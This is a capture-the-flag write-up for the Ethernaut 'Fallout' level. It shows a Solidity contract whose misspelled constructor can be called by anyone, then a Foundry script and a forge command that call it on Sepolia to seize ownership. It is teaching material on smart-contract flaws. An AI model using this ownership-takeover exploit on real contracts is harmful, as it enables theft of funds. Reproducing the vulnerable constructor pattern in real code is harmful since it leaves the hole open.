---
title: "Fal1out"
date: "2024-01-16"
lastmod: "2024-02-14T16:51:00.000Z"
draft: false
difficulty: "⭐"
prev: "Fallback-0f16d7ea49bd4084a635ec4d24c77563"
weight: 3
state: "Terminé"
level-url: "https://ethernaut.openzeppelin.com/level/2"
next: "Coin-Flip-c27578d40d2f427d968d5623d7000dab"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "eb9fe61a-4da9-4324-8fa3-63e1918dd9f6"
  created_time: "2024-02-12T13:39:00.000Z"
  last_edited_time: "2024-02-14T16:51:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel2.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "FPYQ"
        name: "⭐"
        color: "gray"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Fallback-0f16d7ea49bd4084a635ec4d24c77563"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Fallback-0f16d7ea49bd4084a635ec4d24c77563"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date:
        start: "2024-01-16"
        end: null
        time_zone: null
    weight:
      id: "%5Dyda"
      type: "number"
      number: 3
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/2"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Coin-Flip-c27578d40d2f427d968d5623d7000dab"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Coin-Flip-c27578d40d2f427d968d5623d7000dab"
          href: null
    type:
      id: "s%7DKc"
      type: "select"
      select:
        id: "OnJy"
        name: "docs"
        color: "default"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Fal1out"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Fal1out"
          href: null
  url: "https://www.notion.so/Fal1out-eb9fe61a4da943248fa363e1918dd9f6"
  public_url: null
UPDATE_TIME: "2024-02-23T22:51:26.952Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```


We have to claim the owner ship of the program, we can see that their is nothing that seems to prevent us from calling Fal1out() so let’s try that:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";


interface Fallout {
  function allocatorBalance(address allocator) external view returns (uint);

  function Fal1out() external payable;

  function allocate() external payable;

  function sendAllocation(address payable allocator) external;

  function collectAllocations() external;
}

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_02");
        console.logAddress(addr);
        vm.startBroadcast(deployerPrivateKey);

        Fallout instance = Fallout(addr);
        instance.Fal1out{value: 1}(); //value 1 isnot needed but just in case


        vm.stopBroadcast();
    }
}
```


```solidity
source .env
forge script ./script/02.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv
```

